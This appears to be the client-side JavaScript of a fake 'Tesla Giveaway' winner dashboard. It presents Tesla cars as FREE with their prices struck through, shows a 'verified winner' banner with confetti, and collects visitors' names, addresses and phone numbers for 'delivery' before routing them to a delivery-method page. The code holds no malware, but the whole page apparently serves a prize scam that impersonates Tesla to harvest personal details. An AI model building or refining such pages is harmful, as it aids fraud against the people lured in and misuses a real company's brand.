// ╔══════════════════════════════════════════════════════════╗
// ║     Tesla Giveaway — Winner Dashboard Logic              ║
// ╚══════════════════════════════════════════════════════════╝

// Car images match homepage exactly (ibb.co)
var cars = [
  { id:'cybertruck', name:'Cybertruck', price:'$71,985', emoji:'🛻',
    img:'https://i.ibb.co/Psv2bHHT/0ab12312-ffdc-4474-bd2b-343a034e4710.png',
    specList:['325 mi Range','4.1s 0–60 mph','112 mph Top Speed','5 Seats','Dual Motor AWD'],
    badge:'Built Tough', detailPage:'vehicles/cybertruck.html' },
  { id:'modely', name:'Model Y', price:'$41,380', emoji:'🚙',
    img:'https://i.ibb.co/vvH8dXZm/57a721cf-f5f9-42c3-91d6-f0d7d08977b7.png',
    specList:['321 mi Range','6.8s 0–60 mph','135 mph Top Speed','5–7 Seats','Rear-Wheel Drive'],
    badge:'Best Seller', detailPage:'vehicles/modely.html' },
  { id:'models', name:'Model S', price:'$111,380', emoji:'🏎️',
    img:'https://i.ibb.co/mrRWYHYd/ebcd3520-52de-4781-80db-7311c551ea99.png',
    specList:['410 mi Range','3.1s 0–60 mph','200 mph Top Speed','5 Seats','Dual Motor AWD'],
    badge:'Luxury Performance', detailPage:'vehicles/models.html' },
  { id:'model3', name:'Model 3', price:'$38,380', emoji:'🚗',
    img:'https://i.ibb.co/MxCqNz6P/80f15904-8202-4901-ac2c-b9a1a66bb1df.png',
    specList:['321 mi Range','5.8s 0–60 mph','140 mph Top Speed','5 Seats','Rear-Wheel Drive'],
    badge:'Most Popular', detailPage:'vehicles/model3.html' },
  { id:'modelx', name:'Model X', price:'$116,380', emoji:'🚐',
    img:'https://i.ibb.co/Y4N4GP4b/05586fa8-0530-4b0a-b70a-7b13c39dbcb7.png',
    specList:['352 mi Range','3.8s 0–60 mph','149 mph Top Speed','7 Seats','Dual Motor AWD'],
    badge:'Iconic Design', detailPage:'vehicles/modelx.html' }
];

var selectedCar = null;

document.addEventListener('DOMContentLoaded', async function() {
  var urlSession = getParam('session');
  if (urlSession) {
    saveSession(urlSession);
    if (window.history && window.history.replaceState) {
      window.history.replaceState(null, '', 'dashboard.html');
    }
  }

  var session = getSession();
  if (!session) { 
    window.location.href = 'entry.html'; 
    return; 
  }

  try {
    var data = await apiCall('/session?token=' + encodeURIComponent(session));
    if (!data.valid) { 
      clearSession(); 
      window.location.href = 'entry.html'; 
      return; 
    }

    if (urlSession) {
      var banner = document.getElementById('verifiedBanner');
      if (banner) {
        banner.style.display = 'flex';
        var nameDisplay = document.getElementById('userNameDisplay');
        if (nameDisplay) {
          nameDisplay.textContent = data.user.firstName || data.user.email.split('@')[0];
        }
      }
      launchConfetti(50);
    }

    window._userData = data.user;

    // === PROGRESS RESUMPTION: Detect saved progress and redirect ===
    var savedOrder = JSON.parse(localStorage.getItem('tesla_last_order') || 'null');
    var savedDelivery = JSON.parse(localStorage.getItem('tesla_delivery_details') || 'null');
    var savedMethod = JSON.parse(localStorage.getItem('tesla_delivery_method') || 'null');
    var savedCar = JSON.parse(localStorage.getItem('tesla_selected_car') || 'null');

    if (savedOrder && savedDelivery && savedMethod) {
      // Full progress: delivery method chosen -> go to order success
      window.location.href = 'order-success.html';
      return;
    } else if (savedOrder && savedDelivery) {
      // Has order and delivery but no method -> go to delivery method
      window.location.href = 'delivery-method.html';
      return;
    } else if (savedCar && savedDelivery) {
      // Has car and delivery but no order -> go to delivery details
      window.location.href = 'delivery-details.html';
      return;
    }
    // === END PROGRESS RESUMPTION ===

    var nameInput = document.querySelector('[name="fullName"]');
    if (nameInput && data.user.firstName) {
      nameInput.value = (data.user.firstName + ' ' + (data.user.lastName || '')).trim();
    }
    var phoneInput = document.querySelector('[name="deliveryPhone"]');
    if (phoneInput && data.user.phone) phoneInput.value = data.user.phone;

  } catch (err) { 
    clearSession(); 
    window.location.href = 'entry.html'; 
    return; 
  }

  renderCars();
});

function renderCars() {
  var grid = document.getElementById('carGrid');
  if (!grid) return;
  
  grid.innerHTML = cars.map(function(car) {
    return '<div class="dash-car-card" onclick="window.location.href=\'' + car.detailPage + '?session=' + (getSession()||'') + '\'" style="cursor:pointer;background:#fff;border:1px solid rgba(0,0,0,.06);border-radius:18px;overflow:hidden;transition:all .35s cubic-bezier(.4,0,.2,1);box-shadow:0 6px 24px rgba(0,0,0,.04);display:flex;flex-direction:column;height:100%;">' +
      '<div style="height:220px;background:radial-gradient(circle at center,rgba(227,25,55,.012) 0%,rgba(0,0,0,.02) 100%),#fcfcfc;display:flex;align-items:center;justify-content:center;padding:24px;position:relative;border-bottom:1px solid rgba(0,0,0,.04);">' +
        '<span style="position:absolute;top:16px;right:16px;background:rgba(227,25,55,.07);color:var(--red);border:1px solid rgba(227,25,55,.12);padding:4px 12px;border-radius:99px;font-size:10px;font-weight:700;letter-spacing:.04em;z-index:2;">' + car.badge + '</span>' +
        '<img src="' + car.img + '" alt="Tesla ' + car.name + '" style="height:92%;max-width:100%;object-fit:contain;transition:transform .5s cubic-bezier(.4,0,.2,1);filter:drop-shadow(0 6px 12px rgba(0,0,0,.1));" onerror="this.outerHTML=\'<div style=font-size:56px;>' + car.emoji + '</div>\'">' +
      '</div>' +
      '<div style="padding:24px 22px 26px;">' +
        '<h3 style="font-size:22px;font-weight:800;color:#111;letter-spacing:-.5px;margin:0 0 4px;">Tesla ' + car.name + '</h3>' +
        '<div style="display:flex;align-items:center;gap:10px;margin-bottom:16px;background:rgba(0,0,0,.015);padding:8px 14px;border-radius:8px;border:1px solid rgba(0,0,0,.03);width:fit-content;">' +
          '<span style="font-size:14px;text-decoration:line-through;color:rgba(0,0,0,.35);font-weight:500;">' + car.price + '</span>' +
          '<span style="font-size:12px;font-weight:800;background:var(--red);color:#fff;padding:3px 10px;border-radius:5px;letter-spacing:.05em;box-shadow:0 2px 8px rgba(227,25,55,.3);">FREE</span>' +
        '</div>' +
        '<div class="dash-specs" style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">' +
          car.specList.map(function(s){ var parts=s.split(' '); var v=parts[0]+(parts[1]==='mi'?' mi':''); var l=parts.slice(parts[1]==='mi'?2:1).join(' '); return '<div style="background:rgba(0,0,0,.01);border:1px solid rgba(0,0,0,.025);padding:8px 10px;border-radius:8px;display:flex;flex-direction:column;gap:2px;"><span style="font-size:14px;font-weight:700;color:#111;">'+v+'</span><span style="font-size:10px;color:rgba(0,0,0,.45);font-weight:500;">'+l+'</span></div>'; }).join('') +
        '</div>' +
      '</div>' +
    '</div>';
  }).join('');
}

function selectCar(carId) {
  var cards = document.querySelectorAll('.dash-car-card');
  for (var i = 0; i < cards.length; i++) cards[i].classList.remove('selected');
  
  var card = document.getElementById('card-' + carId);
  if (card) { 
    card.classList.add('selected'); 
  }
  
  selectedCar = null;
  for (var j = 0; j < cars.length; j++) {
    if (cars[j].id === carId) { selectedCar = cars[j]; break; }
  }
  
  if (selectedCar) {
    setStep(3);
    document.getElementById('stepSelectCar').style.display = 'none';
    var deliveryStep = document.getElementById('stepDelivery');
    deliveryStep.style.display = 'block';
    deliveryStep.scrollIntoView({ behavior: 'smooth', block: 'start' });
    
    document.getElementById('selectedCarTitle').textContent = 'Tesla ' + selectedCar.name;
    document.getElementById('selectedCarColor').textContent = selectedCar.price + ' · FREE';
    document.getElementById('selectedCarEmoji').textContent = selectedCar.emoji;
  }
}

function goBackToCars() {
  setStep(2);
  document.getElementById('stepDelivery').style.display = 'none';
  document.getElementById('stepSelectCar').style.display = 'block';
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

function setStep(n) {
  var stepIds = ['sc1','sc2','sc3','sc4'];
  var labelIds = ['sl1t','sl2t','sl3t','sl4t'];
  var lineIds = ['sl1','sl2','sl3'];
  
  for (var i = 0; i < stepIds.length; i++) {
    var stepNum = i + 1;
    var circle = document.getElementById(stepIds[i]);
    var label = document.getElementById(labelIds[i]);
    if (!circle) continue;
    if (stepNum < n) {
      circle.className = 's-circle done'; circle.textContent = '\u2713';
      if (label) label.className = 's-label done';
    } else if (stepNum === n) {
      circle.className = 's-circle active'; circle.textContent = String(stepNum);
      if (label) label.className = 's-label active';
    } else {
      circle.className = 's-circle'; circle.textContent = String(stepNum);
      if (label) label.className = 's-label';
    }
  }
  for (var j = 0; j < lineIds.length; j++) {
    var line = document.getElementById(lineIds[j]);
    if (!line) continue;
    if (j + 2 < n) line.className = 's-line done';
    else line.className = 's-line';
  }
}

document.addEventListener('submit', async function(e) {
  if (e.target.id !== 'deliveryForm') return;
  e.preventDefault();
  var form = e.target;
  var deliveryDetails = {
    fullName: (form.fullName && form.fullName.value || '').trim(),
    address: (form.address && form.address.value || '').trim(),
    city: (form.city && form.city.value || '').trim(),
    state: (form.state && form.state.value || '').trim(),
    zipCode: (form.zipCode && form.zipCode.value || '').trim(),
    country: (form.country && form.country.value || '').trim(),
    phone: (form.deliveryPhone && form.deliveryPhone.value || '').trim(),
    instructions: (form.instructions && form.instructions.value || '').trim(),
  };
  if (!deliveryDetails.fullName || !deliveryDetails.address || !deliveryDetails.city || !deliveryDetails.state || !deliveryDetails.zipCode || !deliveryDetails.country) {
    showToast('Please fill in all required fields.', 'error');
    return;
  }
  try {
    localStorage.setItem('tesla_selected_car', JSON.stringify(selectedCar));
    localStorage.setItem('tesla_delivery_details', JSON.stringify(deliveryDetails));
    localStorage.setItem('tesla_session_token', getSession());
  } catch(e) {
    showToast('Unable to save your progress. Please try again.', 'error');
    return;
  }
  window.location.href = 'delivery-method.html';
});

function logout() {
  clearSession();
  try {
    localStorage.removeItem('tesla_selected_car');
    localStorage.removeItem('tesla_delivery_details');
    localStorage.removeItem('tesla_delivery_method');
    localStorage.removeItem('tesla_last_order');
  } catch(e) {}
  window.location.href = 'index.html';
}
